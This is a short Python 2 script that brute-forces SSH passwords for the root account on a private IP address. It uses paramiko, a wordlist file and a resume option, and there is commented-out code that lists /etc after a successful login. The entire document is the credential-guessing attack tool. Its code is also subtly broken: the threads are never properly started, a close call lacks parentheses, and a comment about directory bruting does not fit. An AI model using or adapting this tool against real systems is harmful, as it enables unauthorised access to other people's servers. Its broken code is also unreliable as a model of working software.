import paramiko
import sys
import os
import socket
import threading
import Queue


password_file = '/root/Documents/python/passwords.txt'
target = '10.0.0.160'
username = 'root'
threads = 10
resume = None

def build_passlist(password_file):
	#read the password file 
	fd = open(password_file, "rb")
	raw_passwords = fd.readlines()
	fd.close()

	found_resume = False
	passwords = Queue.Queue()
	
	for password in raw_passwords:
		password = password.rstrip()
		if resume is not None:
			if found_resume:
				passwords.put(password) 	

			else:
				if password == resume:
					found_resume = True
					print "Resuming password list from: %s" % resume
		else:
			passwords.put(password)
	return passwords

def sshConnection(target, username, passwords):
	attempt = passwords.get()
	attempt_list = []
	# check to see if there is a file extension; if not,
	# it's a directory path we're bruting
	if "." not in attempt:
		attempt_list.append("%s" % attempt)
	else:
		attempt_list.append("%s" % attempt)
	
	
	ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	for password in attempt_list:
		try:
		        ssh.connect( target , username=username , password=password , timeout = 3)
		        print "SUCCESS!!!!!!! This password " + password + " worked with username " + username + " on host " + target
		        ssh.close
		except socket.timeout:
		        print "Connection failed due to timeoute waiting for port 22 to reply for IP: " + target
		except paramiko.AuthenticationException:
		        print "The password " + password + " did not work with username " + username + " on host " + target
		except paramiko.SSHException:
		        print "Connection failed due SSH error for IP: " + target
		except paramiko.ssh_exception.NoValidConnectionsError:
		        print "Connection failed because host is not listening on port 22 (reset) : " + target


passwords = build_passlist(password_file)

for i in range(threads):
	t = threading.Thread(sshConnection(target, username, passwords))
	t.start


#for password in passwords:
#        sshConnection(password)

#stdin,stdout,stderr = ssh.exec_command("ls /etc/")

#for line in stdout.readlines():
#        print line.strip()
sys.exit()

